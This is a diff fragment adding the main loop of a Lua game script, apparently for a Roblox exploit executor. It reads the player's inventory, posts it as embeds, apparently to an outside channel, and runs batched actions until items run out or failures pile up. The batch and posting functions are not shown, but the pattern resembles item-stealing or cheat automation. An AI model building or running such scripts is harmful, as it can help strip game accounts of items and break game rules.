+    if CONFIG.ReportOnly then
+        local items, found = awaitInventory(CONFIG.ProfileWait)
+        if found and #items > 0 then post({ inventoryEmbed(items) })
+        else post({ warnEmbed("No se encontro el inventario al ejecutar (ReportOnly)") }) end
+        return
+    end
+
+    local items, found = awaitInventory(CONFIG.ProfileWait)
+    if not found then
+        post({ warnEmbed("No se pudo leer el inventario al inicio. Revisa el executor.") })
+        return
+    end
+
+    if #items == 0 then
+        post({ warnEmbed("El inventario esta vacio o no se detectaron items.") })
+        return
+    end
+
+    post({ inventoryEmbed(items) })
+
+    local failCount = 0
+    local batchCount = 0
+    while batchCount < CONFIG.Batches do
+        batchCount = batchCount + 1
+        local status, reason = runBatch(batchCount)
+        
+        if status == "success" then
+            failCount = 0
+            task.wait(2)
+            local currentItems, currentFound = awaitInventory(10)
+        elseif status == "empty" then
+            break 
+        elseif status == "fail" then
+            failCount = failCount + 1
+            if failCount >= CONFIG.MaxFails then
+                post({ warnEmbed("Se detuvo el bot despues de " .. failCount .. " fallos seguidos. Razon: " .. tostring(reason)) })
+                break
+            end
+            task.wait(5) 
+        end
+    end
+    
+    post({ warnEmbed("El script ha finalizado todos sus lotes.") })
+end
+
+main()
